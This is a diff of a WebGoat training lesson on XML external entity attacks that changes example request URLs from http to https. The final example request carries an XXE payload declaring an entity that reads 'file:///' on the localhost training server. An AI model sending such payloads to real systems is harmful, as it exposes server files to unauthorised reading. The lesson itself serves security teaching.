@@ -11,7 +11,7 @@ This is a normal json message, let's try to change the content-type of the reque
 
 [source]
 ----
-POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+POST https://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
 Content-Type: application/xml
 
 {"text":"My first comment"}
@@ -37,7 +37,7 @@ This error message appears because we are still sending a json message towards t
 
 [source]
 ----
-POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+POST https://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
 Content-Type: application/xml
 
 <text>This is my first message</text>
@@ -54,7 +54,7 @@ The parser complains that the message is not a valid xml message and needs to be
 
 [source, xml]
 ----
-POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+POST https://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
 Content-Type: application/xml
 
 <comment><text>This is my first message</text></comment>
@@ -64,7 +64,7 @@ The endpoint no longer complains and if you refresh the page in WebGoat the post
 
 [source, xml]
 ----
-POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
+POST https://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
 Content-Type: application/xml
 
 <!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;This is my first message</text></comment>
